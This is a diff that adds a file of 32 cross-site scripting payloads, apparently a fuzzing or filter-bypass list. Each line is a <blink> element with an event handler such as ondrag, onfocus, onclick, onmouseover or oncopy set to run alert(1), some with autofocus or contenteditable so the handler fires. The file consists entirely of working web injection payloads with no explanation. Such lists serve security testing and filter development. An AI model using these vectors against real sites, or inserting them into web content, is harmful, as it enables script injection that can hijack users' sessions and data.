@@ -1,0 +1,32 @@
+<blink draggable="true" ondrag="alert(1)">test</blink>
+<blink draggable="true" ondragend="alert(1)">test</blink>
+<blink draggable="true" ondragenter="alert(1)">test</blink>
+<blink draggable="true" ondragleave="alert(1)">test</blink>
+<blink draggable="true" ondragstart="alert(1)">test</blink>
+<blink id=x tabindex=1 onactivate=alert(1)></blink>
+<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>
+<blink id=x tabindex=1 onbeforedeactivate=alert(1)></blink><input autofocus>
+<blink id=x tabindex=1 ondeactivate=alert(1)></blink><input id=y autofocus>
+<blink id=x tabindex=1 onfocus=alert(1)></blink>
+<blink id=x tabindex=1 onfocusin=alert(1)></blink>
+<blink onbeforecopy="alert(1)" contenteditable>test</blink>
+<blink onbeforecut="alert(1)" contenteditable>test</blink>
+<blink onbeforepaste="alert(1)" contenteditable>test</blink>
+<blink onblur=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onclick="alert(1)">test</blink>
+<blink oncontextmenu="alert(1)">test</blink>
+<blink oncopy="alert(1)" contenteditable>test</blink>
+<blink oncut="alert(1)" contenteditable>test</blink>
+<blink ondblclick="alert(1)">test</blink>
+<blink onfocusout=alert(1) tabindex=1 id=x></blink><input autofocus>
+<blink onkeydown="alert(1)" contenteditable>test</blink>
+<blink onkeypress="alert(1)" contenteditable>test</blink>
+<blink onkeyup="alert(1)" contenteditable>test</blink>
+<blink onmousedown="alert(1)">test</blink>
+<blink onmouseenter="alert(1)">test</blink>
+<blink onmouseleave="alert(1)">test</blink>
+<blink onmousemove="alert(1)">test</blink>
+<blink onmouseout="alert(1)">test</blink>
+<blink onmouseover="alert(1)">test</blink>
+<blink onmouseup="alert(1)">test</blink>
+<blink onpaste="alert(1)" contenteditable>test</blink>
